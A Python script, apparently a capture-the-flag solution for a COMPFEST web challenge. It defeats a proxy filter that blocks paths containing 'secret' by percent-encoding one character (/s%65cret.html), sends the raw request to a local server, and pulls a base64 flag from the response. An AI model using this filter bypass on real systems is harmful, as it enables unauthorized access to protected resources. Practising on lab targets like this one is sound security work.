#!/usr/bin/env python3
"""
Manual test to demonstrate the proxy bypass vulnerability.

The key vulnerability is that the proxy doesn't URL decode the request URI
before checking for "secret" in the path. This allows us to bypass the filter
by URL encoding characters in "secret".

For example:
- Normal request: GET /secret.html HTTP/1.1 (blocked)
- Bypass request: GET /s%65cret.html HTTP/1.1 (where %65 = 'e')
"""

import socket
import base64
import re

def test_url_encoding_bypass():
    """Test the URL encoding bypass technique"""
    
    # The most likely successful bypass
    request = """GET /s%65cret.html HTTP/1.1\r
Host: localhost:8000\r
Connection: close\r
\r
"""
    
    print("Testing URL encoding bypass...")
    print(f"Request: GET /s%65cret.html HTTP/1.1")
    print("(where %65 is the URL-encoded 'e' character)")
    print()
    
    try:
        # Send request
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(("localhost", 8000))
        sock.send(request.encode('ascii'))
        
        # Get response
        response = b""
        while True:
            data = sock.recv(4096)
            if not data:
                break
            response += data
        
        sock.close()
        
        # Parse response
        response_text = response.decode('utf-8', errors='ignore')
        status_line = response_text.split('\r\n')[0]
        
        print(f"Response Status: {status_line}")
        
        if "200 OK" in status_line:
            print("✅ SUCCESS! Bypass worked!")
            
            # Look for the flag
            if "{{ FLAG }}" in response_text:
                print("Found flag placeholder in response")
                
                # Extract base64 encoded flag
                base64_pattern = r'[A-Za-z0-9+/]{20,}={0,2}'
                matches = re.findall(base64_pattern, response_text)
                
                for match in matches:
                    try:
                        decoded = base64.b64decode(match).decode('utf-8')
                        if "COMPFEST" in decoded:
                            print(f"🎉 FLAG FOUND: {decoded}")
                            return decoded
                    except:
                        continue
                
                print("Flag not found in base64 patterns")
            else:
                print("No flag placeholder found in response")
                
            # Show response preview
            print(f"Response preview: {response_text[:300]}...")
            
        elif "301" in status_line or "307" in status_line:
            print("❌ Request was redirected/rejected")
        else:
            print(f"Unexpected response: {response_text[:200]}...")
            
    except ConnectionRefusedError:
        print("❌ Connection refused. Make sure the application is running:")
        print("   docker-compose up --build")
    except Exception as e:
        print(f"❌ Error: {e}")

if __name__ == "__main__":
    flag = test_url_encoding_bypass()
    if flag:
        print(f"\n🎉 SUCCESS! Flag: {flag}")
    else:
        print("\n❌ No flag found")
